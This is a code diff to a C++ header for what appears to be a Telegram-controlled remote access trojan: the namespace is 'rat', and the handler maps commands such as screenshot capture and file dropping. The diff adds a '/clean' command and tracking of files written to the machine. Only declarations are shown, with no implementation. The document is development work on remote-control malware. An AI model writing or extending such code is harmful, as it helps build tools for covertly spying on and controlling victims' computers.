@@ -49,6 +49,8 @@ class Handler {
 	::rat::tbot::Update *telegram_update;
 	::rat::handler::Command command;
 
+	std::vector<std::string> written_files;
+
 	struct CommandHandler {
 		std::string command;
 		void (
@@ -56,9 +58,10 @@ class Handler {
 		                          // that actually executes the handling logic.
 	};
 
-	const std::array<CommandHandler, 23> command_map = {
+	const std::array<CommandHandler, 24> command_map = {
 	    {// resets the internal state of the handler, by destroying the object
 	     // this->state and reinstantiating it.
+	     {"/clean", &Handler::handleCleanCommand},
 	     {"/reset", &Handler::handleResetCommand},
 	     // takes a screenshot of the screen and sends, currently buggy since it
 	     // does not delete the taken screenshot after upload;
@@ -117,7 +120,7 @@ class Handler {
 	void parseTelegramMessageToCommand(void);
 
 	// Command handler methods
-
+	void handleCleanCommand();
 	void handleResetCommand();
 	void handleScreenshotCommand();
 	void handleDropCommand();
@@ -163,6 +166,7 @@ class Handler {
 		this->state = {};
 		this->telegram_update = nullptr;
 		this->command = {};
+		this->written_files.reserve(10);
 	};
 
 	~Handler() {};
